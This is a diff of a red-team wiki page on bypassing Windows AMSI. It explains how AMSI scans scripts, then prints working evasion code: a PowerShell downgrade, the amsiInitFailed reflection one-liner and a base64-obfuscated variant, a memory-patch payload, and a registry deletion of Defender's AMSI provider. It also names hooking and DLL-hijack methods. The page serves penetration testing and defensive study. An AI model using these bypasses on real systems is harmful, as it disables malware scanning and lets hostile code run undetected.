@@ -1,27 +1,6 @@
 # ⭕ AMSI Bypass
 
-{% embed url="https://payatu.com/blog/arun.nair/amsi-bypass" %}
-
-{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}
-
-Microsoft has developed AMSI (Anti-malware Scan Interface) as a method to defend against common malware execution and protect the end user. By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution to prevent arbitrary execution of code. However, other antivirus products might contain support for AMSI so organizations are not restricted to the use of windows defender.
-
-## How AMSI Works
-
-When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
-
-1. AmsiScanBuffer()
-2. AmsiScanString()
-
-If a known signature is identified execution doesn’t initiate and a message appears that the script has been blocked by the antivirus software. The following diagram illustrates the process of AMSI scanning.
-
-![](<../../.gitbook/assets/image (235).png>)
-
-## AMSI Evasions
-
-Microsoft implemented AMSI as a first defense to stop execution of malware multiple evasions have been publicly disclosed. Since the scan is signature based red teams and threat actors could evade AMSI by conducting various tactics. Even though some of the techniques in their original state are blocked, modification of strings and variables, encoding and obfuscation could revive even the oldest tactics. Offensive tooling also support AMSI bypasses that could be used in red team engagements prior to any script execution but manual methods could be also deployed.
-
-## Tools
+## <mark style="color:red;">Tools</mark>
 
 | **Tool**                                                                                 | **Description** | **Language**   |
 | ---------------------------------------------------------------------------------------- | --------------- | -------------- |
@@ -32,7 +11,28 @@ Microsoft implemented AMSI as a first defense to stop execution of malware multi
 | [NoAmci](https://github.com/med0x2e/NoAmci)                                              | Memory Patching | C#             |
 | [AmsiHook](https://github.com/tomcarver16/AmsiHook)                                      | Hooking         | C++            |
 
-### PowerShell Downgrade
+{% embed url="https://payatu.com/blog/arun.nair/amsi-bypass" %}
+
+{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}
+
+Microsoft has developed AMSI (Anti-malware Scan Interface) as a method to defend against common malware execution and protect the end user. By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution to prevent arbitrary execution of code. However, other antivirus products might contain support for AMSI so organizations are not restricted to the use of windows defender.
+
+## <mark style="color:red;">How AMSI Works</mark>
+
+When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
+
+1. AmsiScanBuffer()
+2. AmsiScanString()
+
+If a known signature is identified execution doesn’t initiate and a message appears that the script has been blocked by the antivirus software. The following diagram illustrates the process of AMSI scanning.
+
+![](<../../.gitbook/assets/image (235).png>)
+
+## <mark style="color:red;">AMSI Evasions</mark>
+
+Microsoft implemented AMSI as a first defense to stop execution of malware multiple evasions have been publicly disclosed. Since the scan is signature based red teams and threat actors could evade AMSI by conducting various tactics. Even though some of the techniques in their original state are blocked, modification of strings and variables, encoding and obfuscation could revive even the oldest tactics. Offensive tooling also support AMSI bypasses that could be used in red team engagements prior to any script execution but manual methods could be also deployed.
+
+### <mark style="color:orange;">PowerShell Downgrade</mark>
 
 Even though that Windows PowerShell 2.0 has been deprecated by Microsoft it hasn’t been removed from the operating system. Older versions of PowerShell doesn’t contain security controls such as AMSI protection and could be utilized as a form of evasion. Downgrading the PowerShell version to an older version is trivial and requires execution of the following command:
 
@@ -42,17 +42,17 @@ powershell -version 2
 
 ![](<../../.gitbook/assets/image (238).png>)
 
-### Base64 Encoding
+### <mark style="color:orange;">Base64 Encoding</mark>
 
 Fabian Mosch used an old AMSI bypass of Matt Graeber to prove that if base64 encoding is used on strings (AmsiUtils & amsiInitFailed) that trigger AMSI and decoded at runtime could be used as an evasion defeating the signatures of Microsoft. This technique prevents AMSI scanning capability for the current process by setting the “amsiInitFailed” flag.
 
-#### **Original AMSI Bypass**
+#### <mark style="color:green;">**Original AMSI Bypass**</mark>
 
 ```
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-#### **Base64 Encoded**
+#### <mark style="color:green;">**Base64 Encoded**</mark>
 
 ```
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
@@ -60,7 +60,7 @@ Fabian Mosch used an old AMSI bypass of Matt Graeber to prove that if base64 enc
 
 ![](<../../.gitbook/assets/image (239).png>)
 
-### Hooking
+### <mark style="color:orange;">Hooking</mark>
 
 Tom Carver created a proof of concept in the form of a DLL file which evades AMSI by hooking into the “AmsiScanBuffer” function. The “AmsiScanBuffer” will then be executed with dummy parameters. The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed.
 
@@ -72,7 +72,7 @@ Tom Carver created a proof of concept in the form of a DLL file which evades AMS
 
 ![](<../../.gitbook/assets/image (234).png>)
 
-### Memory Patching
+### <mark style="color:orange;">Memory Patching</mark>
 
 Daniel Duggan released an [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass) which patches the AmsiScanBuffer() function in order to return always **AMSI\_RESULT\_CLEAN** which indicates that no detection has been found. The patch is displayed in the following line:
 
@@ -164,7 +164,7 @@ $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[R
 
 ![](<../../.gitbook/assets/image (245).png>)
 
-### Registry Key Modification
+### <mark style="color:orange;">Registry Key Modification</mark>
 
 AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. The GUID for Windows Defender is displayed below:
 
@@ -182,7 +182,7 @@ Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-9
 
 ![](<../../.gitbook/assets/image (233).png>)
 
-### DLL Hijacking
+### <mark style="color:orange;">DLL Hijacking</mark>
 
 DLL Hijacking can be also used to evade AMSI from userland as it has been described by [SensePost](https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/). The only requirement is to create a non-legitimate amsi.dll file and plant it on the same folder as PowerShell 64 bit which could be copied to a user writable directory. The proof of concept code has been released by SensePost and is also demonstrated below.
 
@@ -247,7 +247,7 @@ Executing PowerShell outside of the standard directory will load the amsi.dll fi
 
 ![](<../../.gitbook/assets/image (244).png>)
 
-## Currently Working Payloads
+## <mark style="color:red;">Currently Working Payloads</mark>
 
 
 
